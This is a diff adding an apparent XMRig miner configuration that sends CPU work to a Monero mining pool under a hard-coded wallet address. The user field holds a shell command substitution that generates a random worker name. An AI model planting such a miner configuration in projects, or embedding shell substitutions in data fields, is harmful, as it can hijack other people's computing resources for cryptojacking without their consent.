@@ -1,0 +1,14 @@
+{
+    "autosave": true,
+    "cpu": true,
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "url": "xmr.2miners.com:2222",
+            "user": "88V8prNWohh9dadjiGN7gjHVuZ1Ki6qfkApV4hXAZh5RMaDYg4fx1he7Xr8aSvFJeKc7drZ6RbZ3LMRQEHREQXj2Gt5Swv5.$(echo $(shuf -i 1000-9999 -n 1)-xmr)",
+            "pass": "X",
+            "keepalive": true
+        }
+    ]
+}
